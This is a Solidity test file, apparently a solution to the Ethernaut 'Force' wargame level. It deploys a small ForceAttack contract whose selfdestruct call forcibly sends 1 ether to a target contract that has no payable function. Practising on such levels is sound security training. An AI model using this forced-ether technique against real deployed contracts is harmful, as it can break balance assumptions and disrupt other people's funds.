// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Force, ForceFactory} from "ethernaut/levels/ForceFactory.sol";

contract ForceLevel is SetUpLevelTest {
    Force internal force;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        playerBalance = 1 ether;
        instanceBalance = 0 ether;
        level = address(new ForceFactory());
        super.setUp();
        force = Force(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        ForceAttack forceAttack = new ForceAttack();
        forceAttack.destroy{value: 1 ether}(address(force));
        vm.stopPrank();
    }
}

contract ForceAttack {
    function destroy(address _addr) public payable {
        selfdestruct(payable(_addr));
    }
}
